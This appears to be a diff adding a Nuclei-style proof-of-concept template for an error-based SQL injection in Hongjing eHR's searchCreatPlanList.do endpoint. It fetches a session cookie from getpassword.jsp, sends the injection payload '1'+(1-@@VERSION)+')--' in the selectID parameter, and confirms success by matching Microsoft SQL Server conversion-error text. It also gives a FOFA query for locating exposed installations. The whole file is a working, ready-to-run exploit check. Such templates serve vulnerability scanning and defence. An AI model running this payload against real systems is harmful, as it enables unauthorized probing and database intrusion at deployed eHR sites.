@@ -1,0 +1,53 @@
+id: poc-yaml-hjsoft-ehr-searchcreatplanlist-do-sqli
+info:
+  name: 宏景eHR searchCreatPlanList.do SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    finger: 宏景eHR
+    fofa: app="HJSOFT-HCM"
+flow: |
+  http(1) && http(2)
+http:
+  - id: get-password
+    method: GET
+    path:
+      - "{{BaseURL}}/templates/index/getpassword.jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "important"
+    extractors:
+      - type: regex
+        name: cookie
+        part: header
+        group: 1
+        regex:
+          - "JSESSIONID=(.*?);"
+  - id: sql-injection-test
+    method: GET
+    path:
+      - "{{BaseURL}}/train/plan/searchCreatPlanList.do?b_selectPlan=query&selectID=1'%2B(1-@@VERSION)%2B')--+"
+    headers:
+      Cookie: "JSESSIONID={{cookie}}"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "&nbsp;信息提示&nbsp;"
+          - "Microsoft SQL Server"
+      - type: regex
+        part: body
+        regex:
+          - "转换成数据类型(.*?)时失败"
+          - "在将(.*?)值"
